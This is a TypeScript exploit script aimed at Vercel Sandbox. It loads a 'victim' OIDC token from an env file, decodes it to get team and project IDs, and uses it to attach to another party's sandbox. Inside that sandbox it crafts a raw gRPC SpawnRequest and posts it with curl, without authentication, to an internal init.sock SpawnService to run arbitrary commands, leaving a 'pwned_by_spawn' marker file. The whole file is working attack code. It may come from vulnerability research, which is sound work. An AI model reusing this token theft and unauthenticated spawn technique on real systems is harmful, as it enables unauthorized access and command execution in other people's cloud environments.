import { Sandbox } from "@vercel/sandbox";
import { readFileSync } from "fs";
function loadEnv(file: string): Record<string, string> {
  const out: Record<string, string> = {};
  for (const line of readFileSync(file, "utf8").split("\n")) {
    const m = line.match(/^([A-Z_]+)=(.*)$/);
    if (m) out[m[1]] = m[2].trim();
  }
  return out;
}
const VICTIM = loadEnv("/tmp/vercel-sandbox/victima/.env.local").VERCEL_OIDC_TOKEN!;
const V = JSON.parse(Buffer.from(VICTIM.split(".")[1], "base64url").toString());

async function main() {
  const sbx = await Sandbox.get({ name: "victim-np", token: VICTIM, teamId: V.owner_id, projectId: V.project_id });
  const res = await sbx.runCommand("bash", ["-c", `
set +e
echo "=== build proto SpawnRequest: command='touch /tmp/pwned_by_spawn'; cwd=/tmp ==="
python3 - << 'PYEOF'
cmd = b"touch /tmp/pwned_by_spawn"
cwd = b"/tmp"
body = b""
body += bytes([0x0a, len(cmd)]) + cmd
body += bytes([0x22, len(cwd)]) + cwd
print("body len:", len(body))
import sys
sys.stdout.buffer.write(body)
PYEOF
echo ""
echo "=== frame it as gRPC and POST to SpawnService/Spawn ==="
python3 - << 'PYEOF'
cmd = b"touch /tmp/pwned_by_spawn"
cwd = b"/tmp"
body = bytes([0x0a, len(cmd)]) + cmd + bytes([0x22, len(cwd)]) + cwd
framed = bytes([0]) + len(body).to_bytes(4, "big") + body
open("/tmp/spawn.msg","wb").write(framed)
print("framed bytes:", framed.hex())
PYEOF
echo "=== now POST via init.sock with curl (gRPC framing, no auth headers) ==="
timeout 8 curl -s --unix-socket /run/vercel/share/init.sock -o /tmp/spawn.out -w "http_code=%{http_code}\\n" \\
  -H 'Content-Type: application/grpc' -H 'TE: trailers' \\
  --data-binary @/tmp/spawn.msg "http://localhost/vercel.sandbox.spawn.v1.SpawnService/Spawn" 2>&1 | tail -2
echo "response bytes:"; xxd /tmp/spawn.out 2>/dev/null | head -3
echo "=== did the process spawn? check marker file ==="
ls -la /tmp/pwned_by_spawn 2>&1
echo "=== also try Ping with framing ==="
printf '\\x00\\x00\\x00\\x00\\x00' > /tmp/empty.msg
timeout 5 curl -s --unix-socket /run/vercel/share/init.sock -o /tmp/ping.out -w "http_code=%{http_code}\\n" \\
  -H 'Content-Type: application/grpc' -H 'TE: trailers' \\
  --data-binary @/tmp/empty.msg "http://localhost/vercel.sandbox.spawn.v1.SpawnService/Ping" 2>&1 | tail -2
echo "ping response:"; xxd /tmp/ping.out 2>/dev/null | head -2
echo DONE
`], { wait: true, timeout: 90_000 });
  console.log("exit:", res.exitCode);
  console.log(await res.output("both"));
}
main().catch((e) => { console.error("ERR", e.message); process.exit(1); });
